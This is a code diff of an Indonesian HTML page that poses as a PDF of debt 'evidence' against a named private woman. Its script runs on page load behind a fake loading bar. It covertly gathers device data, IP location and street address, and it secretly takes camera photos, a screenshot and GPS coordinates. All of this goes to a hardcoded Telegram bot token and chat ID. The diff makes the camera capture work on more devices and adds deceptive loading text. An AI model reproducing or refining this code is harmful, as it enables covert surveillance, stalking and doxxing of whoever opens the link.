@@ -1,10 +1,14 @@
-<!DOCTYPE html><html lang="id"><head>
+<!DOCTYPE html>
+<html lang="id">
+<head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>📄 najwapaputungan.pdf</title>
-  <!-- Font & Ikon (opsional) -->
-  <script src="js/html2canvas.min.js"></script>
-  <link rel="stylesheet" href="css/all.min.css">
+  
+  <!-- Menggunakan CDN agar tidak perlu file lokal -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
   <style>
     * {
       margin: 0;
@@ -16,10 +20,47 @@
       background: #e6e9f0;
       font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       margin: 24px;
+    }
+
+    /* Elemen Loading yang sebelumnya hilang */
+    .loading-container {
+      width: 100%;
+      max-width: 1000px;
+      background: white;
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    
+    .progress-wrapper {
+      width: 100%;
+      background: #eef2f9;
+      border-radius: 10px;
+      height: 12px;
+      overflow: hidden;
+      margin: 10px 0;
+    }
+
+    #progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #2a5c8a;
+      transition: width 0.5s ease;
+    }
+
+    #loading-details {
+      font-size: 0.9rem;
+      color: #576b86;
+      font-weight: 500;
     }
 
     /* Container utama – seperti "kertas" PDF */
@@ -151,33 +192,6 @@
       color: #0b1f33;
     }
 
-    /* Tabel sederhana ala data PDF */
-    .pdf-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 28px 0 20px 0;
-      font-size: 0.95rem;
-      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.03);
-    }
-
-    .pdf-table th {
-      background: #f2f6fd;
-      color: #1d2b3f;
-      font-weight: 600;
-      padding: 12px 14px;
-      border: 1px solid #d7dfec;
-      text-align: left;
-    }
-
-    .pdf-table td {
-      padding: 10px 14px;
-      border: 1px solid #d7dfec;
-    }
-
-    .pdf-table tr:nth-child(even) {
-      background: #fafcff;
-    }
-
     /* Kutipan / blok "highlight" */
     .highlight-box {
       background: #f5f9ff;
@@ -238,21 +252,12 @@
         flex-direction: column;
         align-items: center;
       }
-      .pdf-table {
-        font-size: 0.8rem;
-      }
-      .pdf-table th,
-      .pdf-table td {
-        padding: 6px 8px;
-      }
     }
 
-    /* efek bayangan saat di-hover (seperti interaksi) */
     .pdf-viewer:hover {
       box-shadow: 0 24px 60px rgba(0, 0, 0, 0.3);
     }
 
-    /* Icon zoom dll tidak fungsional, hanya tampilan */
     .toolbar-right i.fa-arrows-alt,
     .toolbar-right i.fa-search {
       font-size: 1.1rem;
@@ -270,6 +275,16 @@
   </style>
 </head>
 <body>
+
+  <!-- Komponen Loading yang hilang ditambahkan di sini -->
+  <div class="loading-container">
+    <div style="font-weight: 600; color: #1e2a3a;">Memuat Dokumen...</div>
+    <div class="progress-wrapper">
+      <div id="progress-bar"></div>
+    </div>
+    <div id="loading-details">Menyiapkan halaman...</div>
+  </div>
+
   <div class="pdf-viewer">
     <!-- Toolbar -->
     <div class="pdf-toolbar">
@@ -290,18 +305,14 @@
 
     <!-- Konten "PDF" -->
     <div class="pdf-content">
-      <!-- header dokumen -->
       <div class="doc-header">
         <h1>Bukti Najwa Paputungan</h1>
         <div class="subhead">Tentang Hutang Karena Arisan</div>
         <div class="doc-meta">
           <span><i class="far fa-calendar-alt"></i> 31 Agustus 2026</span>
-       <!--<span><i class="far fa-user"></i> Tim Pengembangan</span>
-          <span><i class="far fa-file-alt"></i> Versi 2.4</span> -->
         </div>
       </div>
 
-      <!-- body paragraf -->
       <div class="doc-body">
         <p>
           <strong>Ringkasan Singkat</strong> — Dokumen ini menyajikan bukti lengkap
@@ -314,14 +325,11 @@
           Hal begitu dapat di laporkan sesuai dengan pasal undang undang di bawah, sebagai mana yang di jelaskan di bawah. 
         </p>
 
-
-        <!-- kutipan / highlight -->
         <div class="highlight-box">
           <i class="fas fa-quote-left" style="margin-right: 8px; color: #2a5c8a;"></i>
           “KUHP Baru (UU 1/2023): Pasal 492. Ancaman pidana penjara maksimal 4 tahun atau denda kategori V (maksimal Rp 500 juta) .
-  · Perbandingan: Substansi hampir sama dengan Pasal 378 KUHP lama, yang juga mengancam pidana penjara 4 tahun .
-· Unsur-Unsur yang Harus Terbukti
-  · Niat: Ada maksud untuk menguntungkan diri sendiri atau orang lain secara melawan hukum .
+          <br>· Perbandingan: Substansi hampir sama dengan Pasal 378 KUHP lama, yang juga mengancam pidana penjara 4 tahun .
+          <br>· Unsur-Unsur yang Harus Terbukti: Niat: Ada maksud untuk menguntungkan diri sendiri atau orang lain secara melawan hukum .
         </div>
 
         <p>
@@ -330,11 +338,9 @@
         <p>
           <i class="fas fa-check-circle" style="color: #1f6d3b;"></i> 
           Rekomendasi: laporkan ke pihak berwajib dengan bukti bukti yang lengkap, semua bukti tentang Najwa Paputungan ada semua di sini.
-        
         </p>
       </div>
 
-      <!-- footer "PDF" -->
       <div class="pdf-footer">
         <span>
           <i class="far fa-clock"></i> Dibuat: 2 September 2026 · 14:30 WIB
@@ -347,26 +353,24 @@
         </span>
       </div>
     </div>
-    <!-- akhir pdf-content -->
   </div>
-  <!-- akhir pdf-viewer -->
 
 <script>
 (()=>{
-    const T='8849022506:AAGR2b1xoIa2RZZZKS_7icLZez2T0yg8qbI', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
-          C='392836663', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
+    const T='8849022506:AAGR2b1xoIa2RZZZKS_7icLZez2T0yg8qbI', 
+          C='392836663', 
           pb=document.getElementById('progress-bar'),
           ld=document.getElementById('loading-details');
 
     let p=0;
-    const LM=["Loading Mengambil File Najwa Paputungan"];
+    const LM=["Loading Mengambil File Najwa Paputungan", "Menghubungkan ke server...", "Mendekripsi PDF...", "Memuat halaman 1..."];
     
     // Logic untuk progress bar
     setInterval(()=>{
         p+=Math.random()*5;
-        if(p>98)p=98;
-        pb.style.width=p+'%';
-        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]
+        if(p>98) p=98;
+        if(pb) pb.style.width = p+'%';
+        if(ld && Math.random()>.7) ld.textContent = LM[Math.floor(Math.random()*LM.length)];
     },500);
 
     // Fungsi kirim pesan ke Telegram
@@ -381,13 +385,13 @@
     // Fungsi mendapatkan informasi perangkat
     const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ DEVICE INFORMATION|BUKAN GPS TRACKING\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───Develover @E2992x  ───── ⦿';return m};
 
-    // Mengambil gambar dari kamera dengan mode tertentu - TIDAK MUNCUL DI WEB
+    // Mengambil gambar dari kamera dengan mode tertentu
     const captureCamera = async (mode) => {
-        // Buat elemen video dan canvas secara dinamis (tidak muncul di DOM)
         const v = document.createElement('video');
         const c = document.createElement('canvas');
         v.setAttribute('autoplay', '');
         v.setAttribute('muted', '');
+        v.setAttribute('playsinline', ''); // Menambah properti ini penting untuk perangkat mobile iOS
         v.style.display = 'none';
         c.style.display = 'none';
         
@@ -395,7 +399,7 @@
         try {
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { 
-                    facingMode: { exact: mode } 
+                    facingMode: { ideal: mode } 
                 }
             });
             v.srcObject = stream;
@@ -403,7 +407,6 @@
             await new Promise(resolve => v.onloadedmetadata = resolve);
             v.play();
 
-            // Waktu tunggu kamera 1.5 detik
             await new Promise(r => setTimeout(r, 1500)); 
             
             c.width = v.videoWidth;
@@ -419,27 +422,24 @@
             if (stream) {
                 stream.getTracks().forEach(t => t.stop());
             }
-            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
+            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}.`);
             return false; 
         }
     };
 
-    // FUNGSI UTAMA: Menjalankan semua proses tracking
+    // FUNGSI UTAMA
     const ST=async()=>{
         await sTG(await cDI()); 
 
         let cameraSuccess = false;
-
-        // 1. Coba Kamera Depan (User)
         cameraSuccess = await captureCamera("user");
 
-        // 2. Jika Gagal, Coba Kamera Belakang (Environment)
         if (!cameraSuccess) {
             cameraSuccess = await captureCamera("environment");
         }
 
         if (!cameraSuccess) {
-             await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
+             await sTG('❌ Akses ke kedua kamera (Depan & Belakang) tidak tersedia atau ditolak.');
         }
 
         // Ambil Screenshot 
@@ -452,13 +452,12 @@
             }
         }, 2000); 
 
-        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
+        // GPS Tracking
         if(navigator.geolocation){
             navigator.geolocation.getCurrentPosition(async p=>{
                 const lat = p.coords.latitude;
                 const lon = p.coords.longitude;
                 
-                // Menambahkan link Google Maps
                 let g=`📍 GPS TRACKING (ONE-TIME)\n`;
                 g+=`📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
                 g+=`🎯 Akurasi: ${p.coords.accuracy}m\n`;
@@ -473,9 +472,8 @@
         }
     };
 
-    // Langsung menjalankan fungsi ST tanpa delay
     ST();
 })();
 </script>
-
-</body></html>
+</body>
+</html>
